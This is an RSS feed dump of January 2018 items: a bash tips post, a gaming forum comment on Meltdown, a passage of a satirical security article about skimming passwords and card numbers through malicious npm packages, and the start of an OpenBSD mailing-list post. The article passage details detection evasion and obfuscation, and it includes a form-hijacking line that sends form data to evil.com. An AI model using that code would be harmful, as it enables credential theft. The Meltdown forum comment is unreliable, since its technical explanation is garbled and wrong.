&lt;p&gt;It shows which scripts bash decides to run from the top, based on decisions made about the context bash is running in (which decides the colour to follow).&lt;/p&gt;
&lt;p&gt;So if you are in a local (non-remote), non-login, interactive shell (eg when you run bash itself from the command line), you are on the ‘green’ line, and these are the order of files read:&lt;/p&gt;
&lt;pre&gt;
/etc/bash.bashrc
~/.bashrc
[bash runs, then terminates]
~/.bash_logout
&lt;/pre&gt;
&lt;p&gt;This can save you a hell of a lot of time debugging.&lt;/p&gt;
&lt;h2&gt;10) getopts (cheapci)&lt;/h2&gt;
&lt;p&gt;If you go deep with bash, you might end up writing chunky utilities in it. If you do, then getting to grips with &lt;code&gt;getopts&lt;/code&gt; can pay large dividends.&lt;/p&gt;
&lt;p&gt;For fun, I once wrote a &lt;a href=&quot;https://github.com/ianmiell/cheapci/blob/master/cheapci&quot;&gt;script&lt;/a&gt; called &lt;code&gt;cheapci&lt;/code&gt; which I used to work like a Jenkins job.&lt;/p&gt;
&lt;p&gt;The code &lt;a href=&quot;https://github.com/ianmiell/cheapci/blob/master/cheapci#L70-L96&quot;&gt;here&lt;/a&gt; implements the reading of the &lt;a href=&quot;https://github.com/ianmiell/cheapci/blob/master/cheapci#L33-L51&quot;&gt;two required, and 14 non-required arguments&lt;/a&gt;. Better to learn this than to build up a bunch of bespoke code that can get very messy pretty quickly as your utility grows.&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;&lt;strong&gt;This is based on some of the contents of my book&lt;/strong&gt; &lt;a href=&quot;https://leanpub.com/learnbashthehardway&quot;&gt;Learn Bash the Hard Way&lt;/a&gt;, available at &lt;a href=&quot;https://leanpub.com/learnbashthehardway&quot;&gt;$5&lt;/a&gt;:&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://leanpub.com/learnbashthehardway&quot;&gt;&lt;img data-attachment-id=&quot;4192&quot; data-permalink=&quot;https://zwischenzugs.com/2018/01/06/ten-things-i-wish-id-known-about-bash/hero/&quot; data-orig-file=&quot;https://zwischenzugs.files.wordpress.com/2018/01/hero.png&quot; data-orig-size=&quot;600,957&quot; data-comments-opened=&quot;1&quot; data-image-meta=&quot;{&amp;quot;aperture&amp;quot;:&amp;quot;0&amp;quot;,&amp;quot;credit&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;camera&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;caption&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;created_timestamp&amp;quot;:&amp;quot;0&amp;quot;,&amp;quot;copyright&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;focal_length&amp;quot;:&amp;quot;0&amp;quot;,&amp;quot;iso&amp;quot;:&amp;quot;0&amp;quot;,&amp;quot;shutter_speed&amp;quot;:&amp;quot;0&amp;quot;,&amp;quot;title&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;orientation&amp;quot;:&amp;quot;0&amp;quot;}&quot; data-image-title=&quot;hero&quot; data-image-description=&quot;&quot; data-medium-file=&quot;https://zwischenzugs.files.wordpress.com/2018/01/hero.png?w=188&amp;amp;h=300&quot; data-large-file=&quot;https://zwischenzugs.files.wordpress.com/2018/01/hero.png?w=600&quot; class=&quot;alignnone size-medium wp-image-4192&quot; src=&quot;https://zwischenzugs.files.wordpress.com/2018/01/hero.png?w=188&amp;amp;h=300&quot; alt=&quot;hero&quot; width=&quot;188&quot; height=&quot;300&quot; srcset=&quot;https://zwischenzugs.files.wordpress.com/2018/01/hero.png?w=188&amp;amp;h=300 188w, https://zwischenzugs.files.wordpress.com/2018/01/hero.png?w=376&amp;amp;h=600 376w, https://zwischenzugs.files.wordpress.com/2018/01/hero.png?w=94&amp;amp;h=150 94w&quot; sizes=&quot;(max-width: 188px) 85vw, 188px&quot;/&gt;&lt;/a&gt;&lt;/p&gt;

&lt;hr/&gt;&lt;p&gt;I also wrote &lt;a href=&quot;https://www.manning.com/books/docker-in-practice-second-edition?a_aid=zwischenzugs&amp;amp;a_bid=550032fc&quot;&gt;Docker in Practice &lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.manning.com/books/docker-in-practice-second-edition?a_aid=zwischenzugs&amp;amp;a_bid=550032fc&quot;&gt;&lt;strong class=&quot;markup--strong markup--p-strong&quot;&gt;&lt;em class=&quot;markup--em markup--p-em&quot;&gt;Get 39% off with the code: 39miell2&lt;/em&gt;&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;progressiveMedia-image js-progressiveMedia-image&quot; src=&quot;https://zwischenzugs.files.wordpress.com/2017/03/5d342-0v9jkbliyi3uzefqq.jpg?w=640&quot;/&gt;&lt;/p&gt;

&lt;div class=&quot;wpcnt&quot;&gt;
&lt;div class=&quot;wpa wpmrec&quot;&gt;&lt;span class=&quot;wpa-about&quot;&gt;Advertisements&lt;/span&gt;



&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;jp-post-flair&quot; class=&quot;sharedaddy sd-like-enabled sd-sharing-enabled&quot;&gt;
&lt;div class=&quot;sharedaddy sd-sharing-enabled&quot;&gt;
&lt;div class=&quot;robots-nocontent sd-block sd-social sd-social-official sd-sharing&quot;&gt;
&lt;h3 class=&quot;sd-title&quot;&gt;Share this:&lt;/h3&gt;

&lt;/div&gt;
&lt;/div&gt;
&lt;div class=&quot;sharedaddy sd-block sd-like jetpack-likes-widget-wrapper jetpack-likes-widget-unloaded&quot; id=&quot;like-post-wrapper-20870870-4191-5a51d37d4401e&quot; data-src=&quot;//widgets.wp.com/likes/#blog_id=20870870&amp;amp;post_id=4191&amp;amp;origin=zwischenzugs.wordpress.com&amp;amp;obj_id=20870870-4191-5a51d37d4401e&quot; data-name=&quot;like-post-frame-20870870-4191-5a51d37d4401e&quot;&gt;
&lt;h3 class=&quot;sd-title&quot;&gt;Like this:&lt;/h3&gt;
&lt;div class=&quot;likes-widget-placeholder post-likes-widget-placeholder&quot;&gt;&lt;span class=&quot;button&quot;&gt;&lt;span&gt;Like&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;loading&quot;&gt;Loading...&lt;/span&gt;&lt;/div&gt;
&lt;/div&gt;

&lt;/div&gt;
</description>
<pubDate>Sat, 06 Jan 2018 11:08:03 +0000</pubDate>
<dc:creator>zwischenzug</dc:creator>
<og:type>article</og:type>
<og:title>Ten Things I Wish I’d Known About bash</og:title>
<og:url>https://zwischenzugs.com/2018/01/06/ten-things-i-wish-id-known-about-bash/</og:url>
<og:description>Intro Recently I wanted to deepen my understanding of bash by researching as much of it as possible. Because I felt bash is an often-used (and under-understood) technology, I ended up writing a boo…</og:description>
<og:image>https://zwischenzugs.files.wordpress.com/2018/01/hero.png</og:image>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://zwischenzugs.com/2018/01/06/ten-things-i-wish-id-known-about-bash/</dc:identifier>
</item>
<item>
<title>CPU Usage Differences After Applying Meltdown Patch at Epic Games</title>
<link>https://www.epicgames.com/fortnite/forums/news/announcements/132642-epic-services-stability-update</link>
<guid isPermaLink="true" >https://www.epicgames.com/fortnite/forums/news/announcements/132642-epic-services-stability-update</guid>
<description>&lt;div class=&quot;bbcode_container&quot;&gt;
&lt;div class=&quot;bbcode_quote&quot; readability=&quot;6.1454545454545&quot;&gt;
&lt;div class=&quot;quote_container&quot; readability=&quot;7.5636363636364&quot;&gt;

&lt;div class=&quot;bbcode_postedby&quot;&gt;Originally posted by &lt;strong&gt;IchabodCraneMD&lt;/strong&gt; &lt;a href=&quot;https://www.epicgames.com/fortnite/forums/news/announcements/132642-epic-services-stability-update?p=132660#post132660&quot; rel=&quot;nofollow&quot; title=&quot;View Post&quot; class=&quot;b-icon b-icon__double-arrow-right--blue animate-scroll&quot;&gt;View Post&lt;/a&gt;&lt;/div&gt;
&lt;p&gt;How does this affect the console community? Are they separated from these same server issues or is everything combined?&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;br/&gt;This affect about 99% of the hardware in the world including the consoles, smartphone, tablet, PCs, etc.&lt;p&gt;To explain the Meltdown and Specter's effect, it's actually something quite simple to do:&lt;br/&gt;You know the processor is basically the &quot;task handler&quot; of everything in your PC/Console/Tablet,etc. right? It runs those 0 &amp;amp; 1 at a super high speed.&lt;br/&gt;The thing is that to run those 1 &amp;amp; 0, it has to, technically, store them in a physical way so that it can be passed through to what's next. As it's 0 &amp;amp; 1, it's not encrypted or protected. It's pure raw data. The encryption and protection are usually done after the data has passed through the processor... by a task handled by the processor (ironically). Now, what they have &quot;found&quot; (which is false. it's has been known since the 80's) is that it's possible to access this raw data by force feeding some 0 &amp;amp; 1 to the processor which can be hidden in anything and makes it start an hidden small software which, for example, could send a copy of the raw data through the web.&lt;/p&gt;&lt;p&gt;Since the 80's, it was said that it was relatively impossible to decrypt that raw data which pass through the processor as too much information is missing from their meaning. (Like if you're purchasing something through Paypal, the browser doesn't send the data (to be displayed) through the processor with a big &quot;This is the key to this Paypal account&quot;. It's billions of 0 &amp;amp; 1 mixed together going in fast like actual lightning.&lt;/p&gt;&lt;p&gt;The most sensitive possible data that is easier to extract from this process are data like key-logs. Whenever you press any keys on your keyboards, the keyboard send a signal through the wire (or wireless signal) and the motherboard receive it one way or the other. It's a electrical and physical process that is easy to reverse engineer since it's identical regardless of the PC or console. Even consoles have this kind of feature in it, but it's just different. Same with tablet which has a digital keyboard. The processor, to work, does the same thing as an actual key-logger, but for the user and the OS instead of some illegal receiver. What do you think would happen if someone was able to add a small process in your PC so that the processor send all its data not only toward where it's supposed to go, but also to a third party?&lt;/p&gt;&lt;p&gt;As I wrote, the processor only uses raw data. This means that systems that shares data such as Cloud Services basically have this hole that allow anyone to access anything through the processor's real-short memory.&lt;br/&gt;For something like a MMO, one example of use of this weakness in the hardware is that someone, through revert-engineering the data copied and send from the processor, could do anything on the data because he has a registry of everything that is going on in the cloud server.&lt;/p&gt;&lt;p&gt;The fix that is currently being deployed is something really basic and explains why the CPU usage raise through the roof by as much as 40% if not more.&lt;br/&gt;As I explained, the processor doesn't run encrypted data, but instead you got raw data that is encrypted by another processor's task after the raw data passed. The &quot;fix&quot; is to encrypt the data before passing the data (so the processor doesn't have a &quot;log&quot; of the raw file, but instead a log encryption.) This is because steps are not logged... only results of each threads.&lt;/p&gt;&lt;p&gt;Example is if you ask the processor to do a calculation like 10+100*(10/2)-5, it will returns 505. It will log the 505 for a really short while (still enough to be recorded), but it will not record the 10+100*(10/2)-5 steps.&lt;br/&gt;But since the data is encrypted in the processor first, then you got to include the decryption &quot;process&quot; in the calculation process so that what was done with the raw data can be done with the encrypted data.&lt;br/&gt;As the example, that's like if you ask the processor to encrypt something like a password : ABCDE and the encrypted result is 18437439205578, if then you request the processor to manage the task of confirming if it's really 18437439205578, you got to repeat, every time, the decryption process within the confirmation so that anyone who gets his hand on the data only reads 18437439205578 and not ABCDE.&lt;br/&gt;It's 1 additional much more complex task in every steps that, originally, was simple as pie.&lt;/p&gt;&lt;p&gt;This is why the &quot;fix&quot; in the Cloud, in this case, double the CPU usage. as displayed in the graph.&lt;br/&gt;The fix is basically:&lt;br/&gt;Before: (RAW_DATA) &amp;gt; Processor &amp;gt; ENCRYPT_DATA &amp;gt; Processor &amp;gt; STORE_DATA &amp;gt; Processor, then when requested, DECRYPT_DATA &amp;gt; Processor &amp;gt; CHECK_DATA &amp;gt; Processor &amp;gt; ERASE_DATA &amp;gt; Processor.&lt;br/&gt;Now (fix): (RAW_DATA + ENCRYPT_DATA) &amp;gt; Processor &amp;gt; STORE_ENCRYPTED_DATA &amp;gt; Processor, then when requested, (DECRYPT_DATA + CHECK_DATA) &amp;gt; Processor &amp;gt; ERASE_DATA_FROM_RAM &amp;gt; Processor.&lt;/p&gt;&lt;p&gt;With the fix, the processor isn't used as much, but each time, the calculated data is bigger.&lt;br/&gt;(If you don't get why it's slower... It's similar to how we think when we calculate. What's faster?&lt;br/&gt;(200+25) / 5&lt;br/&gt;or&lt;br/&gt;(A*20) + (B * 20 /10) where A is 0.5 and B is 17.5 which is confirmed in the CHECK_DATA request and is not logged.&lt;/p&gt;&lt;p&gt;While in both cases, the answer is 45, but before, someone who has access to the raw data and can reverse-engineer the data will immediately know it's 45 while the one who gets (A*20) + (B * 20 /10) won't know what to do with it because he/she lacks the A or B which is only &quot;known&quot; during the CHECK_DATA and not logged as it's part of the process request and not the results as CHECK_DATA returns a True or False (1 or 0) only.&lt;/p&gt;</description>
<pubDate>Sat, 06 Jan 2018 10:52:12 +0000</pubDate>
<dc:creator>chrisper</dc:creator>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.epicgames.com/fortnite/forums/news/announcements/132642-epic-services-stability-update</dc:identifier>
</item>
<item>
<title>Harvesting credit card numbers and passwords from websites</title>
<link>https://medium.com/@david.gilbertson/im-harvesting-credit-card-numbers-and-passwords-from-your-site-here-s-how-9a8cb347c5b5</link>
<guid isPermaLink="true" >https://medium.com/@david.gilbertson/im-harvesting-credit-card-numbers-and-passwords-from-your-site-here-s-how-9a8cb347c5b5</guid>
<description>&lt;p name=&quot;915c&quot; id=&quot;915c&quot; class=&quot;graf graf--p graf--leading&quot;&gt;Looking back on these golden years, I can’t believe people spend so much time messing around with cross-site scripting to get code into a single site. It’s so easy to ship malicious code to &lt;em class=&quot;markup--em markup--p-em&quot;&gt;thousands&lt;/em&gt; of websites, with a little help from my web developer friends.&lt;/p&gt;
&lt;h3 name=&quot;8d49&quot; id=&quot;8d49&quot; class=&quot;graf graf--h3 graf-after--p&quot;&gt;Some objections you might have to my blatant fear mongering…&lt;/h3&gt;
&lt;h4 name=&quot;7afa&quot; id=&quot;7afa&quot; class=&quot;graf graf--h4 graf-after--h3&quot;&gt;I’d notice the network requests going out!&lt;/h4&gt;
&lt;p name=&quot;2f7c&quot; id=&quot;2f7c&quot; class=&quot;graf graf--p graf-after--h4&quot;&gt;Where would you notice them? My code won’t send anything when the DevTools are open (yes &lt;a href=&quot;https://github.com/sindresorhus/devtools-detect/issues/15#issuecomment-215908435&quot; data-href=&quot;https://github.com/sindresorhus/devtools-detect/issues/15#issuecomment-215908435&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;even if un-docked&lt;/a&gt;).&lt;/p&gt;
&lt;p name=&quot;2cf7&quot; id=&quot;2cf7&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;It also stays silent when running on localhost or any IP address, or where the domain contains dev, test, qa, uat or staging (surrounded by &lt;code class=&quot;markup--code markup--p-code&quot;&gt;\b&lt;/code&gt; word boundaries).&lt;/p&gt;
&lt;h4 name=&quot;58d7&quot; id=&quot;58d7&quot; class=&quot;graf graf--h4 graf-after--p&quot;&gt;Our penetration testers would see it in their HTTP request monitoring tools!&lt;/h4&gt;
&lt;p name=&quot;bdb6&quot; id=&quot;bdb6&quot; class=&quot;graf graf--p graf-after--h4&quot;&gt;What hours do they work? My code doesn’t send anything between 7am and 7pm. It halves my haul, but 95% reduces my chances of getting caught.&lt;/p&gt;
&lt;p name=&quot;513d&quot; id=&quot;513d&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;And I only need your credentials once. So after I’ve sent a request for a device I make a note of it (local storage and cookies) and never send for that device again. Replication is not made easy.&lt;/p&gt;
&lt;p name=&quot;e425&quot; id=&quot;e425&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;Even if some studious little pen tester clears cookies and local storage constantly, I only send these requests intermittently (about one in seven times, lightly randomised — the ideal trouble-shooting-insanity-inducing frequency).&lt;/p&gt;
&lt;p name=&quot;88a8&quot; id=&quot;88a8&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;Also the URL looks a lot like the 300 other requests to ad networks your site makes.&lt;/p&gt;
&lt;p name=&quot;1e36&quot; id=&quot;1e36&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;The point is, just because you don’t see it, doesn’t mean it’s not happening. It’s been more than two years and as far as I know, no one has ever noticed one of my requests. Maybe it’s been in your site this whole time :)&lt;/p&gt;
&lt;p name=&quot;2f61&quot; id=&quot;2f61&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;(Fun fact, when I go through all the passwords and credit card numbers I’ve collected and bundle them up to be sold on the dark web, I have to do a search for &lt;em class=&quot;markup--em markup--p-em&quot;&gt;my&lt;/em&gt; credit card numbers and usernames in case I’ve captured myself. Isn’t that funny!)&lt;/p&gt;
&lt;h4 name=&quot;e703&quot; id=&quot;e703&quot; class=&quot;graf graf--h4 graf-after--p&quot;&gt;I’d see it in your source on GitHub!&lt;/h4&gt;
&lt;p name=&quot;4f45&quot; id=&quot;4f45&quot; class=&quot;graf graf--p graf-after--h4&quot;&gt;Your innocence warms my heart.&lt;/p&gt;
&lt;p name=&quot;21e3&quot; id=&quot;21e3&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;But I’m afraid it’s perfectly possible to ship one version of your code to GitHub and a different version to npm.&lt;/p&gt;
&lt;p name=&quot;4c08&quot; id=&quot;4c08&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;In my &lt;code class=&quot;markup--code markup--p-code&quot;&gt;package.json&lt;/code&gt; I’ve defined the &lt;code class=&quot;markup--code markup--p-code&quot;&gt;files&lt;/code&gt; property to point to a &lt;code class=&quot;markup--code markup--p-code&quot;&gt;lib&lt;/code&gt; directory that contains the minified, uglified nasty code — this is what &lt;code class=&quot;markup--code markup--p-code&quot;&gt;npm publish&lt;/code&gt; will send to npm. But &lt;code class=&quot;markup--code markup--p-code&quot;&gt;lib&lt;/code&gt; is in my &lt;code class=&quot;markup--code markup--p-code&quot;&gt;.gitignore&lt;/code&gt; so it never makes its way to GitHub. This is a pretty common practice so it doesn’t even look suspect if you read through these files on GitHub.&lt;/p&gt;
&lt;p name=&quot;e81c&quot; id=&quot;e81c&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;This is not an npm problem, even if I’m not delivering different code to npm and GitHub, who’s to say that what you see in &lt;code class=&quot;markup--code markup--p-code&quot;&gt;/lib/package.min.js&lt;/code&gt; is the real result of minifying &lt;code class=&quot;markup--code markup--p-code&quot;&gt;/src/package.js&lt;/code&gt;?&lt;/p&gt;
&lt;p name=&quot;5391&quot; id=&quot;5391&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;So no, you won’t find my nasty code anywhere on GitHub.&lt;/p&gt;
&lt;h4 name=&quot;f030&quot; id=&quot;f030&quot; class=&quot;graf graf--h4 graf-after--p&quot;&gt;I read the minified source of all code in node_modules!&lt;/h4&gt;
&lt;p name=&quot;bf20&quot; id=&quot;bf20&quot; class=&quot;graf graf--p graf-after--h4&quot;&gt;OK now you’re just making up objections. But maybe you’re thinking you could write something clever that automatically checks code for anything suspicious.&lt;/p&gt;
&lt;p name=&quot;5240&quot; id=&quot;5240&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;You’re still not going to find much that makes sense in my source, I don’t have the word &lt;code class=&quot;markup--code markup--p-code&quot;&gt;fetch&lt;/code&gt; or &lt;code class=&quot;markup--code markup--p-code&quot;&gt;XMLHttpRequest&lt;/code&gt; anywhere, or the domain that I’m sending to. My fetch code looks like this:&lt;/p&gt;

&lt;p name=&quot;90d3&quot; id=&quot;90d3&quot; class=&quot;graf graf--p graf--startsWithDoubleQuote graf-after--figure&quot;&gt;“gfudi” is just “fetch” with each letter shifted up by one. Hard core cryptography right there. &lt;code class=&quot;markup--code markup--p-code&quot;&gt;self&lt;/code&gt; is an alias for &lt;code class=&quot;markup--code markup--p-code&quot;&gt;window&lt;/code&gt;.&lt;/p&gt;
&lt;p name=&quot;7d96&quot; id=&quot;7d96&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;&lt;code class=&quot;markup--code markup--p-code&quot;&gt;self['\u0066\u0065\u0074\u0063\u0068'](...)&lt;/code&gt; is another fancy way of saying &lt;code class=&quot;markup--code markup--p-code&quot;&gt;fetch(...)&lt;/code&gt;.&lt;/p&gt;
&lt;p name=&quot;3db6&quot; id=&quot;3db6&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;The point: it is very difficult to spot shenanigans in obfuscated code, you’ve got no chance.&lt;/p&gt;
&lt;p name=&quot;7785&quot; id=&quot;7785&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;(With all that said, I don’t actually use anything as mundane as &lt;code class=&quot;markup--code markup--p-code&quot;&gt;fetch&lt;/code&gt;, I prefer &lt;code class=&quot;markup--code markup--p-code&quot;&gt;new EventSource(urlWithYourPreciousData)&lt;/code&gt; where possible. That way even if you’re being paranoid and monitoring outbound requests by using a &lt;code class=&quot;markup--code markup--p-code&quot;&gt;serviceWorker&lt;/code&gt; to listen to &lt;code class=&quot;markup--code markup--p-code&quot;&gt;fetch&lt;/code&gt; events, I will slink right by. I simply don’t send anything for browsers that support &lt;code class=&quot;markup--code markup--p-code&quot;&gt;serviceWorker&lt;/code&gt; but not &lt;code class=&quot;markup--code markup--p-code&quot;&gt;EventSource&lt;/code&gt;.)&lt;/p&gt;
&lt;h4 name=&quot;1e3f&quot; id=&quot;1e3f&quot; class=&quot;graf graf--h4 graf-after--p&quot;&gt;I have a Content Security Policy!&lt;/h4&gt;
&lt;p name=&quot;b2f5&quot; id=&quot;b2f5&quot; class=&quot;graf graf--p graf-after--h4&quot;&gt;Oh, do you now.&lt;/p&gt;
&lt;p name=&quot;10a5&quot; id=&quot;10a5&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;And did somebody tell you that this would prevent malicious code from sending data off to some dastardly domain? I hate to be the bearer of bad news, but the following four lines of code will glide right through even the strictest content security policy.&lt;/p&gt;

Suck it, CSPs
&lt;p name=&quot;6fad&quot; id=&quot;6fad&quot; class=&quot;graf graf--p graf-after--figure&quot;&gt;(In an earlier iteration of this post I said that a solid content security policy would keep you (and I quote) “100% safe”. Unfortunately 130k people read that before I learned the above trick. So I guess the lesson there is that you can’t trust any thing or any one on the internet.)&lt;/p&gt;
&lt;p name=&quot;e2e5&quot; id=&quot;e2e5&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;But CSPs aren’t completely unhelpful. The above only works in Chrome, and a decent CSP &lt;em class=&quot;markup--em markup--p-em&quot;&gt;might&lt;/em&gt; block my efforts in some lesser-used browsers.&lt;/p&gt;
&lt;p name=&quot;552e&quot; id=&quot;552e&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;If you don’t know already, a &lt;a href=&quot;https://www.w3.org/TR/CSP2/&quot; data-href=&quot;https://www.w3.org/TR/CSP2/&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;content security policy&lt;/a&gt; can (try to) restrict what network requests can be made from the browser. It is often worded as restricting what you can &lt;em class=&quot;markup--em markup--p-em&quot;&gt;bring into&lt;/em&gt; the browser, but you can also think of it protecting what can be sent out (when I ‘send’ your users’ passwords to my server, it’s just a query param on a get request).&lt;/p&gt;
&lt;p name=&quot;40fd&quot; id=&quot;40fd&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;In the event that I can’t get data out using the prefetch trick, CSPs are tricky for my credit card collection corporation. And not just because they neuter my nefarious intentions.&lt;/p&gt;
&lt;p name=&quot;6834&quot; id=&quot;6834&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;You see, if I try to send data out from a site that has a CSP, it can alert the site owner of the failed attempt (if they’ve specified a &lt;code class=&quot;markup--code markup--p-code&quot;&gt;report-uri&lt;/code&gt;). They would eventually track this down to my code and probably call my mother and then I would be in &lt;em class=&quot;markup--em markup--p-em&quot;&gt;big&lt;/em&gt; trouble.&lt;/p&gt;
&lt;p name=&quot;3b6e&quot; id=&quot;3b6e&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;Since I don’t want to draw attention to myself (except when on the dance floor) I check your CSP before attempting to send something out.&lt;/p&gt;
&lt;p name=&quot;a2f6&quot; id=&quot;a2f6&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;To do this, I make a dummy request to the current page and read the headers.&lt;/p&gt;

&lt;p name=&quot;cf83&quot; id=&quot;cf83&quot; class=&quot;graf graf--p graf-after--figure&quot;&gt;At this point I can look for holes in your CSP. Astoundingly, the Google sign in page has a bad CSP that would allow me to easily collect your username and password if my code ran on that page. They fail to set &lt;code class=&quot;markup--code markup--p-code&quot;&gt;connect-src&lt;/code&gt; explicitly and also haven’t set the catch-all &lt;code class=&quot;markup--code markup--p-code&quot;&gt;default-src&lt;/code&gt; so I can send your credentials wherever I damn well please.&lt;/p&gt;
&lt;p name=&quot;352e&quot; id=&quot;352e&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;If you send me $10 in the mail I’ll tell you if my code is running on the Google sign in page.&lt;/p&gt;
&lt;p name=&quot;41b0&quot; id=&quot;41b0&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;Amazon has no CSP at all on the page where you type your credit card number in, nor does eBay.&lt;/p&gt;
&lt;p name=&quot;38fb&quot; id=&quot;38fb&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;Twitter and PayPal have CSPs, but it’s still dead easy to get your data from them. These two have made the same mistake, and this is probably a sign that others make it as well. At first glance everything looks pretty thorough, they both set the &lt;code class=&quot;markup--code markup--p-code&quot;&gt;default-src&lt;/code&gt; catch-all like they should. But here’s the kicker: that catch-all doesn’t catch all. They haven’t locked down &lt;code class=&quot;markup--code markup--p-code&quot;&gt;form-action&lt;/code&gt;.&lt;/p&gt;
&lt;p name=&quot;ce28&quot; id=&quot;ce28&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;So, when I’m checking your CSP (and checking it twice), if everything else is locked down but I don’t see &lt;code class=&quot;markup--code markup--p-code&quot;&gt;form-action&lt;/code&gt; in there, I just go and change the action (where the data is sent when you click ‘sign in’) on all your forms.&lt;/p&gt;
&lt;pre name=&quot;2684&quot; id=&quot;2684&quot; class=&quot;graf graf--pre graf-after--p&quot;&gt;
Array.from(document.forms).forEach(formEl =&amp;gt; formEl.action = `//evil.com/bounce-form`);
&lt;/pre&gt;
&lt;p name=&quot;d9cc&quot; id=&quot;d9cc&quot; class=&quot;graf graf--p graf-after--pre&quot;&gt;Boom, thanks for sending me your PayPal username and password, pal. I’ll send you a thank you card with a photo of the stuff I bought with your money.&lt;/p&gt;
&lt;p name=&quot;02d4&quot; id=&quot;02d4&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;Naturally, I only do this trick once per device and bounce the user right back to the referring page where they will shrug and try again.&lt;/p&gt;
&lt;p name=&quot;8b11&quot; id=&quot;8b11&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;(Using this method, I took over Trump’s Twitter account and started sending out all sorts of weird shit. As yet no one has noticed.)&lt;/p&gt;
&lt;h3 name=&quot;91fc&quot; id=&quot;91fc&quot; class=&quot;graf graf--h3 graf-after--p&quot;&gt;OK I am sufficiently concerned, what can I do?&lt;/h3&gt;
&lt;h4 name=&quot;a374&quot; id=&quot;a374&quot; class=&quot;graf graf--h4 graf-after--h3&quot;&gt;Option 1:&lt;/h4&gt;
</description>
<pubDate>Sat, 06 Jan 2018 09:40:47 +0000</pubDate>
<dc:creator>swyx</dc:creator>
<og:title>I’m harvesting credit card numbers and passwords from your site. Here’s how.</og:title>
<og:url>https://hackernoon.com/im-harvesting-credit-card-numbers-and-passwords-from-your-site-here-s-how-9a8cb347c5b5</og:url>
<og:image>https://cdn-images-1.medium.com/max/1200/1*41XiwBL9NXDfGtIXbc3UsQ.jpeg</og:image>
<og:description>The following is a true story. Or maybe it’s just based on a true story. Perhaps it’s not true at all.</og:description>
<og:type>article</og:type>
<dc:format>text/html</dc:format>
<dc:identifier>https://hackernoon.com/im-harvesting-credit-card-numbers-and-passwords-from-your-site-here-s-how-9a8cb347c5b5?gi=6fdbe70cf318</dc:identifier>
</item>
<item>
<title>Meltdown, aka “Dear Intel, you suck”</title>
<link>https://marc.info/?l=openbsd-tech&amp;m=151521435721902&amp;w=2</link>
<guid isPermaLink="true" >https://marc.info/?l=openbsd-tech&amp;m=151521435721902&amp;w=2</guid>
<description>&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html&quot; /&gt;&lt;title&gt;'Meltdown, aka &quot;Dear Intel, you suck&quot;' - MARC&lt;/title&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/style.css&quot; /&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#FFFFFF&quot; text=&quot;#000000&quot; link=&quot;#0000C0&quot; vlink=&quot;#800080&quot; id=&quot;readabilityBody&quot; readability=&quot;36.053846153846&quot;&gt;
&lt;pre&gt;
&lt;strong&gt;[&lt;a href=&quot;https://marc.info/?l=openbsd-tech&amp;amp;m=151521426921898&amp;amp;w=2&quot;&gt;prev in list&lt;/a&gt;] [&lt;a href=&quot;https://marc.info/?l=openbsd-tech&amp;amp;m=151521436221903&amp;amp;w=2&quot;&gt;next in list&lt;/a&gt;] [&lt;span&gt;prev in thread&lt;/span&gt;] [&lt;a href=&quot;https://marc.info/?l=openbsd-tech&amp;amp;m=151521473321941&amp;amp;w=2&quot;&gt;next in thread&lt;/a&gt;] &lt;/strong&gt;
&lt;strong&gt;&lt;span&gt;
List:       &lt;a href=&quot;https://marc.info/?l=openbsd-tech&amp;amp;r=1&amp;amp;w=2&quot;&gt;openbsd-tech&lt;/a&gt;
Subject:    &lt;a href=&quot;https://marc.info/?t=151521438600001&amp;amp;r=1&amp;amp;w=2&quot;&gt;Meltdown, aka &quot;Dear Intel, you suck&quot;&lt;/a&gt;
From:       &lt;a href=&quot;https://marc.info/?a=120626338000015&amp;amp;r=1&amp;amp;w=2&quot;&gt;Philip Guenther &amp;lt;guenther () gmail ! com&amp;gt;&lt;/a&gt;
